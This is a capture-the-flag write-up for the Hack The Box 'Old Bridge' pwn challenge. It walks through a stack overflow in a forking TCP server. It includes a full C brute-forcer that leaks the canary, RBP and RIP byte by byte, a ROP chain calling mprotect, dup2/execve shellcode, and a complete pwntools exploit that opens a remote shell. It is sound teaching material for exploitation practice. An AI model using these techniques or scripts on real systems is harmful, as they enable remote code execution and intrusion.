# Hack The Box - Old Bridge (pwn challenge)

## Recon

As always, let's start off by checking what mitigations are enabled in the binary:

```
$ checksec ./oldbridge
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Ok, the GOT is writeable, that could come in handy later on. Now that we have some idea of what types of attacks could be feasible on this binary, let's limit ourselves to doing some static analysis to see what the program actually does.

After some reading we find out that the program basically takes in a port number, opens a TCP server on that port, and listens for incoming connectios. Every time a connection arrives, it is handled by a `fork` of the parent process, and the parent goes back to listening for more connections. What does the child do? Well, it looks like it just asks for a username, runs a simple check on whatever the client answers and then sends the string "Username found!\n" to the client if the answer was right.

The function executed by the child process (namely, `check_username`) is rather simple, it just sends a prompt to the client, waits for an answer, and then it `xor`s every byte of the answer by `0x0d`, after that it compapres it the first 6 bytes of the answer with `il{dih`. If the two strings are equal it returns 1, otherwise it returns 0. `main` in turn will take the return value of this function and print "Username found!\n" if the answer was right. There's only one detail that is of interest here, the buffer used to store the answer sent by the client is `0x408` bytes long, but the `read` function is passed `0x420` as it's second parameter, effectively resulting in a buffer overflow if more than `0x408` bytes are sent (we could check this by firing up netcat and sending `0x420` 'A's).

```
239: check_username (int64_t arg1);
; var int64_t fildes @ rbp-0x424
; var int64_t res @ rbp-0x41c
; var int64_t var_418h @ rbp-0x418
; var ssize_t var_414h @ rbp-0x414
; var void *buf @ rbp-0x410
; var int64_t canary @ rbp-0x8
; arg int64_t arg1 @ rdi
0x00000b6f      push    rbp
0x00000b70      mov     rbp, rsp
0x00000b73      sub     rsp, 0x430
0x00000b7a      mov     dword [fildes], edi ; arg1
0x00000b80      mov     rax, qword fs:[0x28]
0x00000b89      mov     qword [canary], rax
0x00000b8d      xor     eax, eax

;		res = 0; // Will later be changed to 1 if the username is right
0x00000b8f      mov     dword [res], 0

;		write(fildes, "Username: ", 10);
0x00000b99      mov     eax, dword [fildes]
0x00000b9f      mov     edx, 0xa   ; size_t nbytes
0x00000ba4      lea     rsi, str.Username: ; 0xf94 ; const char *ptr
0x00000bab      mov     edi, eax   ; int fd
0x00000bad      call    write      ; sym.imp.write ; ssize_t write(int fd, const char *ptr, size_t nbytes)

;		read(fildes, buf, 0x420); // But buf is at rbp-0x410!!!
0x00000bb2      lea     rcx, [buf]
0x00000bb9      mov     eax, dword [fildes]
0x00000bbf      mov     edx, 0x420 ; size_t nbyte
0x00000bc4      mov     rsi, rcx   ; void *buf
0x00000bc7      mov     edi, eax   ; int fildes
0x00000bc9      call    read       ; sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte)
```

> The code responsible for the vulnerability (comments added for the sake of clarity)

### Obtaining the canary (and everything else as well)

So far so good, we have discovered what appears to be the only vulnerability in the code. But at first glance it doesn't seem all that useful; sure, we have a buffer overflow, but we also have canaries enabled, so we can't make use of that overflow just yet. This is were the fun begins, remember how the process we're dealing with when we send our reply is a fork of another process? It turns out that if we look at the man page for `fork` we find this: `fork() creates a new process by duplicating the calling process. [...] At the time of fork() both memory spaces have the same content`. So it's safe to assume that immediately after forking, the memory of each process is identical (there are a few exceptions, but we are not concerned with them right now). This means that if we could guess the canary for one of the childs, we would also have the canary for every possible child, as well as for the parent process.

Now, how do we actually go about finding the canary? It's a 64 bit number, so we can't just brute force it. What we can do though, is brute force 1 byte at a time. That way, instead of bruteforcing a 64 bit value, we would only need to brute-force 8 8-bit values. How do we go about doing it? It's simple, we can send the correct answer for the username (turns out it's "davide"), followed by `0x402` 'A's, and then a 0. That way we'll write a 0 into the least significant byte of the canary, if the program spits back "Username Found!\n", then the program didn't crash and that byte was the right byte for that position, otherwise we try with 1 instead of 0, and so on (there's a catch, though, every byte we send will be `xor`ed with `0x0d`, so we need to `xor` it before sending it as well, so that the second `xor` will bring it back to its original value).

So far we've figured out a potential way of obtaining the canary, but it won't be of much use if we can't locate the binary in memory, or the location of the stack. But why not brute force them too? It's somewhat odd, but the very same logic that applies to the canary, applies to the `RBP` and `RIP` in the stack frame for `check_username` as well. If we figure out with what value to overwrite the `RBP` and `RIP` stored in the stack and still get back an answer, chances are, those would be the values that were originally stored there. So, we may set out to write a simple program that will try to get thoses values, here's my attempt at doing so using C:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

struct sockaddr_in addr;
struct timeval tv;

int createSocket () {
    int desc = socket(AF_INET, SOCK_STREAM, 0);
    if (desc == -1) {
        return -1;
    }
    if (setsockopt(desc, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) != 0) {
        return -1;
    }
    if (connect(desc, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        return -1;
    }
    return desc;
}

uint8_t *bruteForce (uint32_t size, uint32_t offset, uint32_t length) {
    assert(size >= offset + length);
    uint8_t *packet = malloc(size);
    uint8_t *res = malloc(length);
    uint8_t *response = malloc(512);
    memset(packet, 0, size);
    packet[0] = 'd';
    packet[1] = 'a';
    packet[2] = 'v';
    packet[3] = 'i';
    packet[4] = 'd';
    packet[5] = 'e';

    uint8_t nextTry = 0;
    for (uint32_t i = 0; i < length;) {
        int fd = createSocket();
        if (fd == -1) {
            fprintf(stderr, "Error creating socket!\n");
            free(res);
            free(packet);
            free(response);
            return NULL;
        }
        int receivedLen = read(fd, response, 512);
        if (receivedLen <= 0) {
            fprintf(stderr, "Error establishing connection!\n");
            free(res);
            free(packet);
            free(response);
            return NULL;
        }

        packet[offset + i] = nextTry ^ 0xd;
        write(fd, packet, offset + i + 1);
        receivedLen = read(fd, response, 512);

        if (receivedLen == 16 && strncmp("Username found!\n", (char*)response, 16) == 0) {
            printf("Byte %d: 0x%.2x\n", i, nextTry);
            res[i] = nextTry;
            i++;
            nextTry = 0;
            if (i == 0x10) { // Hardcode this value
                nextTry = 0xcf;
            }
        } else {
            nextTry++;
            if (nextTry == 0) {
                fprintf(stderr, "Detected circular condition at byte %d!\n", i);
		free(res);
            	free(packet);
            	free(response);
		return NULL;
            }
        }
        close(fd);
    }
    free(packet);
    free(response);
    return res;
}

int main (int argc, char* argv[]) {
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1234);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    memset(addr.sin_zero, 0, 8);
    uint8_t *sequence = bruteForce(0x420, 0x408, 0x18);
    if (sequence != NULL) {
        uint64_t canary = *(uint64_t*)sequence;
        uint64_t rbp = *((uint64_t*)(sequence + 0x8));
        uint64_t rip = *((uint64_t*)(sequence + 0x10));
        printf("Canary: %p\nRBP: %p\nRIP: %p\n", (void*)canary, (void*)rbp, (void*)rip);
	free(sequence);
    }
    return 0;
}
```

That may not be the best way to do error handling in C, I know, but hey, it works. Also, I added a timeout of 1 sec just in case something goes wrong, as well as check in case we get to a point where we tried every possible value for a given byte and still get no response. Also, I hardcoded the value for byte 16 (the least significant byte of the `RIP`), since it was a known value (given the offset from the start of the binary from where the function is called) and for some reasong brute forcing that value just didn't work for me.

If that program works (after a quick test we can see it does), then we will have the value for the canary (remember, it will be the same in every fork of the parent process, as well as in the parent itself), the position of the stack, and the position of the binary. Well, actually we still got a few more things to do, but the hardest part is over.

One of the values this program spits out is the `RBP` which was saved in the stack during the execution of `check_username`, but we will want to calculate the address of the buffer where our answer is stored, since that's were we can insert arbitrary values and that will probably be of use. How do we go about calculating that? Well, the `RBP` saved in the stackframe of `check_username` is the `RBP` which was in use during the execution of `main` (since that's where this function is called from), so we'll take a look at the prologue for `main`:

```
627: int main (int argc, char * argv[]);
0x00000c99      push    rbp
0x00000c9a      mov     rbp, rsp
0x00000c9d      sub     rsp, 0x60
[...]
```

Ok, so the `RBP` during the execution of `main` is equal to `RSP + 0x60`. After `check_username` gets called, two additional values will be pushed onto the stack (the `RIP` that points to the next instruction after `call check_username`, and the `RBP` itself), so at that point `RBP` will be equal to `RSP + 0x70`. Then, as part of `check_username`'s prologue, `RSP` will be copied to `RBP`, so that new `RBP` is equal to the `RBP` we obtained minus `0x70`. Subtract `0x410` from that and we've got ourselves the address of our buffer.

As for `RIP`, the proccess is a lot easier. We just need to subtract the offset of the instruction that comes after `call check_username` at `main` from the `RIP` we leaked. That way we've found the address at which the binary starts. And using the offsets obtained through static analysis, we can locate any instruction we want.

## Exploitation

At this point, we've got a buffer overflow, the addresses for both the stack and the binary itself, as well as the canary (and a ton of gadgets, given the size of program). All that's left for us to do is to decide upon our preferred exploitation method. We could make use of the partial RELRO to invoke `system("/bin/sh")` or something, or we could call `mprotect` using some ROP chain and then execute some shellcode. There's only one thing we've got to bear in mind during the exploitation though, we don't have access to stdin, stdout or stderr, and our only way of communicating with the exploit is through the file descriptor returned by `accept`, which was called in `main`.

This last thing is less intimidating than it looks though, given that file descriptors 0, 1 and 2 are reserved, and the program only created one socket before calling accept (so it only reserved one more file descriptor). What all of this means is that the file descriptor returned by accept will _most likely_  be 4 (remember, the parent process closes every file descriptor returned by accept before listening again, so even if we established a bunch of connections to the program, every fork of the process will be using file descriptor 4 for talking with its respective client).

Since finding the location of the libc in memory is troublesome, and we'll probably have to do some fancy trick to bypass the fact that we can't speak with the process directly through stdin/out, I've chosen to go with the shellcode approach.

### Highjacking control flow

Given that we now know the location of the binary in memory, we can use offsets to calculate the address of any gadget we want, so let's fire up `ROPGadget` and see what we can find that'll help us take control of the execution of the program:

```
$ ROPgadget --binary ./oldbridge 
Gadgets information
============================================================
[...]
0x0000000000000b6d : leave ; ret
[...]

Unique gadgets found: 154
```

That seems like it! Remember that we'll need to overwrite the `RBP` stored in the stackframe for `check_username` before overwriting the `RIP`, so that `leave` instruction in the gadget shown above will insert our malicious `RBP` into `RSP`, and pop the top value of the stack into `RBP` (though we probably won't need `RBP` after that, so we can just fill it with junk). After that, the program will `ret` to whathever address is stored at `[RSP]`, efectively allowing us to start a giant ROP chain if we make `RSP` point to the buffer used in `check_username` (remember, we've calculated this address at the end of the previous section). So far, our malicious buffer would need to look something like this:

| Buffer | Offset |
|:------:|:-------:|
| `b'davide\x00\x00'` | 0x0|
| _padding_ | 0x8 |
| ... | ...|
| _canary_ | 0x408 |
| _bufferAddress_ + 0x8 | 0x418 |
| _binaryAddress_ + 0xb6d | 0x420 |

Now we've got 0x400 bytes of free space to create our ROP chain and insert our shellcode as well, it should be more than enough.

### Calling `mprotect`

In order to make our buffer executable, we need 5 things: 4 instructions to pop values into `RAX`, `RDI`, `RSI`, and `RDX`, as well as a `syscall` instruction, all of these need to be followed by a `ret` instruction. So let's look for them with `ROPGadget` (as already stated, the binary is fairly big, it should have all of these instructions):

```
$ ROPgadget --binary ./oldbridge 
Gadgets information
============================================================
[...]
0x0000000000000b6d : leave ; ret
[...]
0x0000000000000b51 : pop rax ; ret
[...]
0x0000000000000f73 : pop rdi ; ret
0x0000000000000b53 : pop rdx ; ret
0x0000000000000f71 : pop rsi ; pop r15 ; ret
[...]
0x0000000000000b55 : syscall

Unique gadgets found: 154
```

That was lucky, the only thing left to do is to check if that `syscall` gadget at offset `0xb55` is actually followed by a `ret`. It turns out it is! Looking at that offset with radare2 we find:

```
helper ();
; var int64_t var_8h @ rbp-0x8
[...]
0x00000b55      syscall
0x00000b57      ret
[...]
```

Now, I'm not gonna go over exactly how to create the ROP chain, it should be a fairly straightforward process to anyone who has done ROP before. Suffice to say, the end result should look something like this:

| Buffer | Offset |
|:------:|:-------:|
| `b'davide\x00\x00'` | 0x0|
| _padding_ | 0x8 |
| _binaryAddress_ + 0xb51 | 0x10 |
| 0xa | 0x18 |
| _binaryAddress_ + 0xf73 | 0x20 |
| _bufferAddress_ & `0xfffffffffffff000` | 0x28 |
| _binaryAddress_ + 0xf71 | 0x30 |
| 0x1000 | 0x38 |
| _padding_ | 0x40 |
| _binaryAddress_ + 0xb53 | 0x48 |
| 0x7 | 0x50 |
| _binaryAddress_ + 0xb55 | 0x58 |
| _bufferAddress_ + 0x68 | 0x60 |
| Shellcode | 0x68 |
| ... | ...|
| _canary_ | 0x408 |
| _bufferAddress_ + 0x8 | 0x418 |
| _binaryAddress_ + 0xb6d | 0x420 |

This will result in the program executing `mprotect(bufferAddress & 0xfffffffffffff000, 0x1000, 7)`, which will make the whole page in with the buffer is stored executable (the and is necessary because `mprotect` does not like page-unaligned addresses), and then it will jump to our shellcode. There might be some edge case if our buffer is close enough to a page boundary, in that case we might need to make one more page executable, but let's hope that doesn't happen and just keep on going.

### Shellcode

The payload mentioned in the previous section will leave us with plenty of room for shellcode, but hopefully we won't need that much space. Let's see what happens.

Remember how our only way of comunicating with the program was through file descriptor 4? That mean no stdin/out/err for us, and we don't like that. One thing we could do is blindly trying to `open` and `read` a file called `flag.txt`, and then write it's contents to file descriptor 4. That approach should work, as long as the flag is actually stored in a file called `flag.txt`, but we've got no guarantee that that's the case.

A second, more flexible approach would be to `dup2` file desciptor 4 to file descriptors 0, 1 and 2. This will result in all three of stdin/out/err being the same as file descriptor 4. Then we could execute `execve("/bin/sh", NULL, NULL)` and make it communicate directly with us, instead of using the actual stdin/out. I happen to like that approach a bit better, plus getting a remote shell is always nice, so let's go with that (remember, all of the I/O is being done through `read` and `write`, so we don't need to be careful about special characters):

```
	; dup2(4, 0);
	mov eax, 33
	mov rdi, 4
	xor rsi, rsi
	syscall

	; dup2(4, 1);
	mov eax, 33
	mov rdi, 4
	mov rsi, 1
	syscall

	; dup2(4, 2);
	mov eax, 33
	mov rdi, 4
	mov rsi, 2
	syscall

	; execve("/bin/sh", NULL, NULL);
	mov eax, 59
	lea rdi, [rip + .binsh]
	xor rsi, rsi
	xor rdx, rdx
	syscall
.binsh:
	.string "/bin/sh"
```

This shellcode is not particularly compact, but it's readable and it works, plus it only weights about 90 bytes, so it's compact enough.

### Putting it all together

So, now we need a small python script that puts together a payload like the one described above, along with the shellcode and sends it to the program. My solution was this:

```Python
from pwn import *

context.update(os='linux', arch='amd64')
p = remote('127.0.0.1', 1234)

def transform(byteStream):
    res = b''
    for i in byteStream:
        res += (i ^ 0xd).to_bytes(1, 'little')
    return res

# Here we input the values we got from our previous program
reportedRbp = 0x0 # TODO: plug correct value
reportedRip = 0x0 # TODO: plug correct value
reportedCanary = 0x0 # TODO: plug correct value

binaryLocation = reportedRip - 0xecf
buffLocation = reportedRbp - 0x70 - 0x410
payloadLocation = buffLocation + 0x8
shellcodeLocation = payloadLocation + 12 * 0x8
popRax_Ret_Location = binaryLocation + 0xb51
popRdi_Ret_Location = binaryLocation + 0xf73
popRsi_popR15_Ret_Location = binaryLocation + 0xf71
popRdx_Ret_Location = binaryLocation + 0xb53
syscall_Ret_Location = binaryLocation + 0xb55
leave_Ret_Location = binaryLocation + 0xb6d

shellcode = b'\xb8\x21\x00\x00\x00\x48\xc7\xc7\x04\x00\x00\x00\x48\x31\xf6\x0f\x05\xb8\x21\x00\x00\x00\x48\xc7\xc7\x04\x00\x00\x00\x48\xc7\xc6\x01\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x48\xc7\xc7\x04\x00\x00\x00\x48\xc7\xc6\x02\x00\x00\x00\x0f\x05\xb8\x3b\x00\x00\x00\x48\x8d\x3d\x08\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00'

payload = b''
payload += b'davide\x00\x00'
payload += p64(0x0) # padding for the 'leave' instruction
payload += transform(p64(popRax_Ret_Location))
payload += transform(p64(0xa))
payload += transform(p64(popRdi_Ret_Location))
payload += transform(p64(payloadLocation & 0xfffffffffffff000))
payload += transform(p64(popRsi_popR15_Ret_Location))
payload += transform(p64(0x1000))
payload += transform(p64(0x0)) # padding for 'pop r15'
payload += transform(p64(popRdx_Ret_Location))
payload += transform(p64(0x7))
payload += transform(p64(syscall_Ret_Location))
payload += transform(p64(shellcodeLocation))
payload += transform(shellcode)

payload += b'A' * (0x408 - len(payload)) # padding

payload += transform(p64(reportedCanary))
payload += transform(p64(payloadLocation))
payload += transform(p64(leave_Ret_Location))

if len(payload) != 0x420:
    p.error('Wrong shellcode size, expected 0x420 but got: ' + hex(len(payload)))

p.clean(1)
p.send(payload)
p.interactive()
```

Nice, keep in mind that everything we send (apart from "davide") needs to be `xor`ed byte by byte by `0x0d`, to account for the `xor` that will be done in `check_username`.

So, let's see if it works:

```
$ ./a.out 
Byte 0: 0x00
Byte 1: 0xb2
Byte 2: 0x9e
Byte 3: 0xad
Byte 4: 0x90
Byte 5: 0x6c
Byte 6: 0xc0
Byte 7: 0x1e
Byte 8: 0xc0
Byte 9: 0x0e
Byte 10: 0xce
Byte 11: 0xe1
Byte 12: 0xfd
Byte 13: 0x7f
Byte 14: 0x00
Byte 15: 0x00
Byte 16: 0xcf
Byte 17: 0x5e
Byte 18: 0x12
Byte 19: 0x1a
Byte 20: 0xc0
Byte 21: 0x55
Byte 22: 0x00
Byte 23: 0x00
Canary: 0x1ec06c90ad9eb200
RBP: 0x7ffde1ce0ec0
RIP: 0x55c01a125ecf
```
Now we insert those values in the script and then:

```
$ python openShell.py 
[+] Opening connection to [htb IP] on port [htp Port]: Done
[*] Switching to interactive mode
$ ls
core
flag.txt
oldbridge
$
```

And we're done!

